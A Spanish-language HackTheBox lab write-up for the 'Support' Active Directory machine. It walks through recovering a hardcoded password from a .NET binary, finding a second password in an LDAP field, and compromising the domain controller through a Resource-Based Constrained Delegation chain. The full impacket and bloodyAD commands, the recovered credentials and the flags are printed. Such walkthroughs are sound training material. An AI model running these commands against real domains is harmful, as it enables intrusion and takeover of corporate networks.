---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
  tags:
    visible: true
---

# Support HackTheBox (Easy)

## Contexto de la maquina

### Trayectoria Support

<figure><img src="../../.gitbook/assets/trayectoria_support.png" alt=""><figcaption></figcaption></figure>

### Descripción

La máquina presenta un entorno **Active Directory** basado en Windows Server, donde se abordan múltiples vectores de ataque típicos en entornos corporativos: enumeración SMB, análisis de binarios, extracción de credenciales, abuso de LDAP y escalada mediante delegación Kerberos.

**Objetivo del reto**

* Obtener acceso inicial al dominio mediante credenciales expuestas.
* Escalar privilegios dentro del dominio hasta comprometer el **Domain Controller**.
* Capturar las flags de usuario y administrador.

**Tipo de máquina**

* Windows (Active Directory)

**Habilidades y técnicas evaluadas**

* Enumeración SMB y LDAP
* Análisis de binarios (.NET)
* Ingeniería inversa básica
* Descifrado de credenciales (XOR + Base64)
* Uso de herramientas como `mono`, `ghidra`, `ldapsearch`, `netexec`
* BloodHound y análisis de relaciones AD
* Abuso de permisos (GenericAll)
* Ataque **Resource-Based Constrained Delegation (RBCD)**
* Uso de herramientas Impacket

### Análisis de vulnerabilidades

<figure><img src="../../.gitbook/assets/vuln1_support.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vuln2_support.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vuln3_support.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vuln4_support.png" alt=""><figcaption></figcaption></figure>

## Escaneo de puertos

Comenzamos realizando un escaneo completo de puertos TCP para identificar los servicios expuestos en la máquina objetivo.

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

Una vez identificados los puertos abiertos, lanzamos un escaneo más detallado sobre ellos para obtener versiones y scripts por defecto.

```shell
nmap -sCV -p<PORTS> <IP>
```

Resultado:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-25 15:05 -0400
Nmap scan report for 10.129.14.53
Host is up (0.044s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-25 19:05:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-03-25T19:06:20
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.43 seconds
```

Observamos múltiples servicios típicos de un **Controlador de Dominio (Active Directory)**:

* Kerberos (`88`)
* LDAP (`389`, `3268`)
* SMB (`445`)
* RPC
* WinRM (`5985`)

No se detecta un servidor web tradicional en los puertos estándar (`80/443`), pero sí se identifica un dominio:

```
support.htb
```

Lo añadimos a nuestro archivo `/etc/hosts` para poder resolverlo correctamente:

```shell
nano /etc/hosts

#Dentro del nano
<IP>           support.htb
```

## Enumeración SMB

Dado que el servicio SMB está expuesto, intentamos listar los recursos compartidos de forma anónima:

```shell
smbclient -L //support.htb -N
```

Respuesta:

```
Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share
```

#### Observación

Destaca el recurso compartido `support-tools`, ya que no es un recurso por defecto y puede contener información relevante.

### Acceso al recurso compartido

Intentamos acceder al recurso de forma anónima:

```shell
smbclient //support.htb/support-tools -N
```

Respuesta:

```
Try "help" to get a list of possible commands.
smb: \>
```

Listamos su contenido:

```
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

		4026367 blocks of size 4096. 967978 blocks available
```

La mayoría son herramientas estándar de Windows, pero hay dos archivos especialmente interesantes:

* `SysinternalsSuite.zip`
* `UserInfo.exe.zip`

### Análisis de archivos

Descargamos el primero:

```shell
get SysinternalsSuite.zip
```

Una vez que lo tengamos en nuestro `host` vamos a descomprimirlo dentro de una carpeta que creemos:

```shell
mkdir sysInternalsSuite
cd sysInternalsSuite
mv ../SysinternalsSuite.zip .
unzip SysinternalsSuite.zip
```

Tras descomprimirlo, observamos múltiples herramientas conocidas de Windows, pero ninguna aporta información relevante en este punto.

Por lo tanto, centramos la atención en el segundo archivo:

```shell
get UserInfo.exe.zip
unzip UserInfo.exe.zip
```

Contenido:

```
.rw-rw-rw- kali kali  98 KB Tue Mar  1 13:18:50 2022  CommandLineParser.dll
.rw-rw-rw- kali kali  22 KB Fri Oct 22 19:42:08 2021  Microsoft.Bcl.AsyncInterfaces.dll
.rw-rw-rw- kali kali  46 KB Fri Oct 22 19:48:04 2021  Microsoft.Extensions.DependencyInjection.Abstractions.dll
.rw-rw-rw- kali kali  83 KB Fri Oct 22 19:48:22 2021  Microsoft.Extensions.DependencyInjection.dll
.rw-rw-rw- kali kali  63 KB Fri Oct 22 19:51:24 2021  Microsoft.Extensions.Logging.Abstractions.dll
.rw-rw-rw- kali kali  20 KB Wed Feb 19 05:05:18 2020  System.Buffers.dll
.rw-rw-rw- kali kali 138 KB Wed Feb 19 05:05:18 2020  System.Memory.dll
.rw-rw-rw- kali kali 113 KB Tue May 15 09:29:44 2018  System.Numerics.Vectors.dll
.rw-rw-rw- kali kali  18 KB Fri Oct 22 19:40:18 2021  System.Runtime.CompilerServices.Unsafe.dll
.rw-rw-rw- kali kali  25 KB Wed Feb 19 05:05:18 2020  System.Threading.Tasks.Extensions.dll
.rwxrwxrwx kali kali  12 KB Fri May 27 13:51:05 2022  UserInfo.exe
.rw-rw-rw- kali kali 563 B  Fri May 27 12:59:39 2022  UserInfo.exe.config
```

## Escalada a usuario (LDAP)

### Análisis de `UserInfo.exe`

Para analizar el binario, utilizamos `mono`, que permite ejecutar binarios .NET en sistemas Linux:

```shell
mono UserInfo.exe -h
```

Respuesta:

```
Usage: UserInfo.exe [options] [commands]

Options: 
  -v|--verbose        Verbose output                                    

Commands: 
  find                Find a user                                       
  user                Get information about a user
```

Esto indica que se trata de una herramienta interna para consultar información de usuarios, probablemente mediante LDAP.

Sin embargo, al ejecutarla localmente no obtenemos información útil, por lo que procedemos a analizar el binario de forma estática.

### Ingeniería inversa

Abrimos el binario con `ghidra` para inspeccionar su funcionamiento interno:

```shell
ghidra
```

Tras analizar el binario, identificamos una función interesante llamada:

```
getPassword
```

Esto sugiere que el programa podría contener credenciales o lógica sensible embebida.

<figure><img src="../../.gitbook/assets/Pasted image 20260325205407.png" alt=""><figcaption></figcaption></figure>

### Decompilación con IL

Dado que es un binario .NET, podemos obtener una representación más clara utilizando `monodis`:

```shell
monodis --output=UserInfo.il UserInfo.exe
```

Esto genera un archivo en lenguaje intermedio (IL), que facilita el análisis de funciones internas.

A continuación, filtramos el contenido para localizar la función `getPassword` y analizar su lógica, con el objetivo de identificar posibles credenciales hardcodeadas o mecanismos de autenticación reutilizables.

### Credenciales Hardcodeadas

<figure><img src="../../.gitbook/assets/vuln1Card_support.png" alt=""><figcaption></figcaption></figure>

Para profundizar en el análisis del binario previamente decompilado (`UserInfo.il`), filtramos directamente la función `getPassword` para identificar posibles credenciales embebidas:

```shell
awk '/method.*getPassword/,/^}/' UserInfo.il
```

Resultado:

```
} // end of method Protected::getPassword

    // method line 16
    .method public hidebysig specialname rtspecialname 
           instance default void '.ctor' ()  cil managed 
    {
        // Method begins at RVA 0x2168
	// Code size 7 (0x7)
	.maxstack 8
	IL_0000:  ldarg.0 
	IL_0001:  call instance void object::'.ctor'()
	IL_0006:  ret 
    } // end of method Protected::.ctor

    // method line 17
    .method private static hidebysig specialname rtspecialname 
           default void '.cctor' ()  cil managed 
    {
        // Method begins at RVA 0x2170
	// Code size 31 (0x1f)
	.maxstack 8
	IL_0000:  ldstr "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
	IL_0005:  stsfld string UserInfo.Services.Protected::enc_password
	IL_000a:  call class [mscorlib]System.Text.Encoding class [mscorlib]System.Text.Encoding::get_ASCII()
	IL_000f:  ldstr "armando"
	IL_0014:  callvirt instance unsigned int8[] class [mscorlib]System.Text.Encoding::GetBytes(string)
	IL_0019:  stsfld unsigned int8[] UserInfo.Services.Protected::key
	IL_001e:  ret 
    } // end of method Protected::.cctor

  } // end of class UserInfo.Services.Protected
}
```

#### Análisis

De este fragmento podemos extraer dos elementos clave:

* **Cadena cifrada (Base64):**

```
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
```

* **Clave utilizada:**

```
armando
```

Por el patrón observado, es razonable asumir que el valor está protegido mediante un esquema de cifrado basado en **XOR + Base64**.

### Decodificación de la contraseña

Para recuperar la contraseña en texto claro, desarrollamos un script en Python que replica el proceso de descifrado:

> decodeText.py

```python
#!/usr/bin/env python3
import base64

# Datos del IL
enc_password_b64 = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = "armando"
xor_value = 223

# Decodificar Base64
encrypted_bytes = base64.b64decode(enc_password_b64)

# Convertir key a bytes
key_bytes = key.encode('ascii')

# Descifrar XOR
decrypted_bytes = bytearray()
for i, byte in enumerate(encrypted_bytes):
    key_byte = key_bytes[i % len(key_bytes)]
    decrypted_byte = byte ^ key_byte ^ xor_value
    decrypted_bytes.append(decrypted_byte)

# Convertir a string
password = decrypted_bytes.decode('ascii')
print(f"Contraseña: {password}")
```

Ejecutamos el script:

```shell
python3 decodeText.py
```

Respuesta:

```
Contraseña: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Hemos obtenido una contraseña válida, pero aún no conocemos el usuario asociado.

### Enumeración del usuario

Para identificar posibles usuarios, filtramos cadenas relevantes dentro del `.il`:

```shell
grep -E "ldstr\s+\"[^\"]{3,}\"" UserInfo.il | grep -v "Attribute\|Assembly\|Copyright\|System\|Microsoft"
```

Respuesta:

```
IL_0010:  ldstr "UserInfo.exe"
	IL_0000:  ldstr "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
	IL_000f:  ldstr "armando"
	IL_000d:  ldstr "LDAP://support.htb"
	IL_0012:  ldstr "support\\ldap"
	 IL_0006:  ldstr "[-] At least one of -first or -last is required."
	 IL_0018:  ldstr "(givenName="
	 IL_002e:  ldstr "(sn="
	 IL_0049:  ldstr "(&(givenName="
	 IL_0055:  ldstr ")(sn="
	 IL_0070:  ldstr "[*] LDAP query to use: "
	 IL_0097:  ldstr "sAMAccountName"
	 IL_00b6:  ldstr "[-] No users identified with that query."
	 IL_00c8:  ldstr "[+] Found "
	 IL_00db:  ldstr " result"
	   IL_0126:  ldstr "       "
	   IL_0135:  ldstr "sAMAccountName"
	 IL_016e:  ldstr "[-] Exception: "
	 IL_0003:  ldstr "[*] Getting data for "
	 IL_0019:  ldstr "sAMAccountName="
	 IL_0034:  ldstr "pwdLastSet"
	 IL_004a:  ldstr "lastLogon"
	 IL_0060:  ldstr "givenName"
	 IL_008c:  ldstr "mail"
	 IL_00a6:  ldstr "[-] Unable to locate "
	 IL_00ac:  ldstr ". Please try the find command to get the user's username."
	 IL_00c6:  ldstr "givenName"
	 IL_00d8:  ldstr "First Name:           "
	 IL_00e3:  ldstr "givenName"
	 IL_0121:  ldstr "Last Name:            "
	 IL_0158:  ldstr "mail"
	 IL_016a:  ldstr "Contact:              "
	 IL_0175:  ldstr "mail"
	 IL_01a1:  ldstr "pwdLastSet"
	 IL_01b3:  ldstr "pwdLastSet"
	 IL_01ce:  ldstr "Last Password Change: "
	 IL_01e7:  ldstr "[-] Exception: "
	IL_0001:  ldstr "find"
	IL_000b:  ldstr "Find a user"
	IL_0001:  ldstr "user"
	IL_000b:  ldstr "Get information about a user"
```

Veremos una llamada que es la siguiente:

```
IL_0012:  ldstr "support\\ldap"
```

Esto sugiere claramente que el usuario es:

```
ldap
```

### Validación de credenciales

Probamos las credenciales obtenidas contra el servicio SMB utilizando `netexec`:

```shell
netexec smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb
```

Respuesta:

```
SMB         10.129.14.53    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) 
SMB         10.129.14.53    445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Las credenciales son válidas, lo que nos permite autenticarnos correctamente en el dominio.

## Escalate user support

Con credenciales válidas, procedemos a realizar una enumeración completa del dominio utilizando **RustHound** (alternativa moderna a BloodHound ingestor):

```shell
apt install cargo
cargo install rusthound
export PATH="$HOME/.cargo/bin:$PATH"
rusthound --domain support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --zip
```

Respuesta:

```
---------------------------------------------------
Initializing RustHound at 16:13:30 on 03/25/26
Powered by g0h4n from OpenCyber
---------------------------------------------------

[2026-03-25T20:13:30Z INFO  rusthound] Verbosity level: Info
[2026-03-25T20:13:30Z INFO  rusthound::ldap] Connected to SUPPORT.HTB Active Directory!
[2026-03-25T20:13:30Z INFO  rusthound::ldap] Starting data collection...
[2026-03-25T20:13:31Z INFO  rusthound::ldap] All data collected for NamingContext DC=support,DC=htb
[2026-03-25T20:13:31Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
[2026-03-25T20:13:31Z INFO  rusthound::json::parser::bh_41] MachineAccountQuota: 10
[2026-03-25T20:13:31Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
[2026-03-25T20:13:31Z INFO  rusthound::json::checker] Starting checker to replace some values...
[2026-03-25T20:13:31Z INFO  rusthound::json::checker] Checking and replacing some values finished!
[2026-03-25T20:13:31Z INFO  rusthound::json::maker] 21 users parsed!
[2026-03-25T20:13:31Z INFO  rusthound::json::maker] 61 groups parsed!
[2026-03-25T20:13:31Z INFO  rusthound::json::maker] 1 computers parsed!
[2026-03-25T20:13:31Z INFO  rusthound::json::maker] 1 ous parsed!
[2026-03-25T20:13:31Z INFO  rusthound::json::maker] 1 domains parsed!
[2026-03-25T20:13:31Z INFO  rusthound::json::maker] 2 gpos parsed!
[2026-03-25T20:13:31Z INFO  rusthound::json::maker] 21 containers parsed!
[2026-03-25T20:13:31Z INFO  rusthound::json::maker] .//20260325161331_support-htb_rusthound.zip created!

RustHound Enumeration Completed at 16:13:31 on 03/25/26! Happy Graphing!
```

Se genera un archivo `.zip` compatible con **BloodHound**, que contiene toda la información necesaria para analizar relaciones, privilegios y posibles vectores de escalada dentro del dominio.

El siguiente paso será importar estos datos en BloodHound para identificar rutas de privilegio hacia usuarios más privilegiados, como `support` o incluso `Domain Admin`.

### BloodHound

Ahora vamos a instalar `BloodHound` de forma rapida en un `docker`:

URL = [Download BloodHound en Docker](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)

```shell
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install
```

Respuesta:

```
..............................<RESTO DE INFO>......................................
Container bloodhound-graph-db-1  Creating
 Container bloodhound-app-db-1  Creating
 Container bloodhound-graph-db-1  Created
 Container bloodhound-app-db-1  Created
 Container bloodhound-bloodhound-1  Creating
 Container bloodhound-bloodhound-1  Created
 Container bloodhound-app-db-1  Starting
 Container bloodhound-graph-db-1  Starting
 Container bloodhound-app-db-1  Started
 Container bloodhound-graph-db-1  Started
 Container bloodhound-graph-db-1  Waiting
 Container bloodhound-app-db-1  Waiting
 Container bloodhound-graph-db-1  Healthy
 Container bloodhound-app-db-1  Healthy
 Container bloodhound-bloodhound-1  Starting
 Container bloodhound-bloodhound-1  Started
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

Ahora que esta importado en nuestro `docker` y levantado podremos acceder a el desde la siguiente `URL`.

```
URL = http://127.0.0.1:8080/ui/login
```

Nos logueamos con las credenciales propocionadas por la herramienta, entrando nos pedira cambiar las credenciales y ya nos metera dentro:

```
User: admin
Pass: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
```

Al iniciar sesión, la herramienta nos pedirá cambiar la contraseña. Tras esto, ya podremos acceder al panel principal.

A continuación, importamos el archivo `.zip` generado previamente con **RustHound**. Tras unos segundos de procesamiento, tendremos disponibles todos los datos del dominio para su análisis.

#### Análisis inicial

Una vez cargados los datos, comenzamos investigando el usuario `ldap`, pero no encontramos vectores de ataque relevantes asociados a este.

<figure><img src="../../.gitbook/assets/Pasted image 20260325212018.png" alt=""><figcaption></figcaption></figure>

Sin embargo, al revisar el resto de usuarios del dominio, identificamos un usuario interesante: `support`, el cual presenta ciertos permisos destacables.

<figure><img src="../../.gitbook/assets/Pasted image 20260325211802.png" alt=""><figcaption></figcaption></figure>

Aunque inicialmente no podemos explotarlos directamente, lo marcamos como objetivo potencial.

#### Enumeración de usuarios vía LDAP

Para obtener todos los usuarios del dominio, realizamos una enumeración mediante `LDAP`:

```shell
ldapsearch -x -H ldap://support.htb -b "DC=support,DC=htb" -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' "(objectClass=user)" sAMAccountName | grep "sAMAccountName" | awk '{print $2}' > users.txt
```

Con la lista de usuarios generada, intentamos realizar un ataque de **Kerberoasting**, pero no obtenemos resultados válidos.

Tras continuar con la enumeración, observamos que el usuario `support` tiene permisos para autenticarse mediante **WinRM**, lo que lo convierte en un objetivo prioritario.

### Análisis LDAP (usuario support)

Procedemos a extraer toda la información del objeto `support` desde LDAP:

<figure><img src="../../.gitbook/assets/vuln2Card_support.png" alt=""><figcaption></figcaption></figure>

```shell
ldapsearch -x -H ldap://support.htb -b "DC=support,DC=htb" -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' "(sAMAccountName=support)"
```

Respuesta:

```
# extended LDIF
#
# LDAPv3
# base <DC=support,DC=htb> with scope subtree
# filter: (sAMAccountName=support)
# requesting: ALL
#

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 10
codePage: 0
countryCode: 0
badPasswordTime: 134189960649326342
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z

# search reference
ref: ldap://ForestDnsZones.support.htb/DC=ForestDnsZones,DC=support,DC=htb

# search reference
ref: ldap://DomainDnsZones.support.htb/DC=DomainDnsZones,DC=support,DC=htb

# search reference
ref: ldap://support.htb/CN=Configuration,DC=support,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

Este valor tiene alta probabilidad de ser una contraseña almacenada en texto claro o reutilizada.

#### Validación de credenciales

Probamos estas credenciales con `netexec`:

```shell
netexec smb support.htb -u support -p 'Ironside47pleasure40Watchful'
```

Respuesta:

```
SMB         10.129.14.165   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) 
SMB         10.129.14.165   445    DC               [+] support.htb\support:Ironside47pleasure40Watchful
```

Confirmamos que las credenciales son válidas.

### Acceso mediante WinRM

Dado que el usuario `support` tiene acceso por WinRM, establecemos una sesión remota:

```shell
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```

Respuesta:

```
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support
```

Veremos que hemos accedido de forma correcta, por lo que leeremos la `flag` del usuario.

> user.txt

```
54e1870ec344ac0ad980c8b62a59f080
```

## Escalate Privileges

<figure><img src="../../.gitbook/assets/vuln3Card_support.png" alt=""><figcaption></figcaption></figure>

Recordando el análisis previo en BloodHound, el usuario `support` pertenece al grupo **Shared Support Accounts**, el cual tiene permisos elevados sobre el **Domain Controller (DC)**.

Esto nos permite explotar un escenario de **Resource-Based Constrained Delegation (RBCD)**.

***

#### ¿Qué es RBCD?

La **Delegación Restringida Basada en Recursos (RBCD)** es una característica de Active Directory que permite que un servicio actúe en nombre de otros usuarios. Normalmente, cuando un servicio necesita acceder a recursos en nombre de un usuario, el administrador configura qué servicios pueden delegar y hacia dónde.

#### ¿Cómo funciona el ataque?

En un ataque RBCD, hacemos lo siguiente:

1. **Crear una computadora falsa** - Como usuario autenticado del dominio, podemos agregar hasta 10 computadoras al dominio. Creamos una computadora que controlamos (ej: `ATTACKER$`).
2. **Configurar delegación** - Usando el permiso `GenericAll` que tenemos sobre el Controlador de Dominio (DC), le decimos al DC: "Confía en mi computadora falsa, permite que actúe en tu nombre".
3. **Solicitar ticket de usuario** - Pedimos a Kerberos un ticket que nos permita actuar como un usuario privilegiado (Administrador) pero usando nuestra computadora falsa como intermediaria.
4. **Pasar el ticket** - Tomamos ese ticket y lo usamos para autenticarnos como Administrador en el DC.

#### Analogía simple

Imagina que:

* Eres un empleado (`support`) en una empresa con credenciales limitadas
* Tu jefe (`Administrador`) tiene todas las llaves
* Hay un grupo de confianza (`Shared Support Accounts`) que tiene permiso para modificar cerraduras
* Este grupo puede decirle a la cerradura principal (DC) que le dé acceso a tu llave falsa
* Creas una llave falsa (`ATTACKER$`) y le dices a la cerradura: "confía en esta llave falsa"
* Luego usas esa llave falsa para pedir acceso como el jefe
* La cerradura te da un ticket de acceso como si fueras el jefe

***

<figure><img src="../../.gitbook/assets/vuln4Card_support.png" alt=""><figcaption></figcaption></figure>

Para comenzar con la explotación, vamos a crear una **cuenta de máquina** desde nuestra máquina atacante utilizando `impacket`, autenticándonos con las credenciales del usuario `support`:

```shell
impacket-addcomputer support.htb/support:'Ironside47pleasure40Watchful' -method SAMR -computer-name ATTACKER$ -computer-pass 'P@ssw0rd!'
```

Respuesta:

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account ATTACKER$ with password P@ssw0rd!.
```

Esto confirma que la cuenta de máquina `ATTACKER$` ha sido creada correctamente en el dominio.

A continuación, aprovechamos el permiso `GenericAll` que posee el grupo **Shared Support Accounts** sobre el **Domain Controller (DC)** para configurar la delegación RBCD, permitiendo que nuestra máquina controlada sea confiable para realizar impersonación:

```shell
python3 bloodyAD.py -d support.htb -u support -p 'Ironside47pleasure40Watchful' --host <IP_VICTIM> add rbcd "CN=DC,OU=Domain Controllers,DC=support,DC=htb" "CN=ATTACKER,CN=Computers,DC=support,DC=htb"
```

Respuesta:

```
[!] No security descriptor has been returned, a new one will be created
[+] CN=ATTACKER,CN=Computers,DC=support,DC=htb can now impersonate users on CN=DC,OU=Domain Controllers,DC=support,DC=htb via S4U2Proxy
[+] e.g. badS4U2proxy 'kerberos+pw://support.htb\support:Ironside47pleasure40Watchful@10.129.14.165/?serverip=10.129.14.165' 'HOST/CN=DC,OU=Domain Controllers,DC=support,DC=htb@support.htb' 'Administrator@support.htb'
```

Con esto, hemos configurado correctamente la delegación basada en recursos, permitiendo que `ATTACKER$` pueda **impersonar usuarios** contra el DC mediante Kerberos.

El siguiente paso consiste en solicitar un ticket Kerberos (TGS) impersonando al usuario `Administrator` mediante el flujo **S4U2Self + S4U2Proxy**:

```shell
impacket-getST -spn 'HOST/DC.support.htb' -impersonate Administrator -dc-ip <IP_VICTIM> 'support.htb/ATTACKER$:P@ssw0rd!'
```

Respuesta:

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@HOST_DC.support.htb@SUPPORT.HTB.ccache
```

Se ha generado correctamente un ticket Kerberos válido para el usuario `Administrator`.

Para facilitar su uso, renombramos el fichero generado y lo exportamos en la variable de entorno `KRB5CCNAME`, lo que permitirá autenticarnos mediante Kerberos sin necesidad de contraseña:

```shell
mv Administrator@HOST_DC.support.htb@SUPPORT.HTB.ccache Administrator.ccache
export KRB5CCNAME=/<PATH>/Administrator.ccache
```

Además, añadimos la resolución del hostname del controlador de dominio para evitar problemas de conectividad:

```shell
nano /etc/hosts

#Dentro del nano
<IP>           support.htb dc.support.htb
```

Finalmente, utilizamos el ticket Kerberos para autenticarnos como `Administrator` contra el DC mediante `wmiexec` de `impacket`:

```shell
impacket-wmiexec -k -no-pass support.htb/Administrator@dc.support.htb
```

Respuesta:

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
support\administrator
```

Esto confirma que hemos conseguido acceso como **Administrator**, comprometiendo completamente el Domain Controller.

Por lo que leeremos la `flag` del usuario `admin`.

> root.txt

```
0930e063043c982f5930541820c3b6e8
```
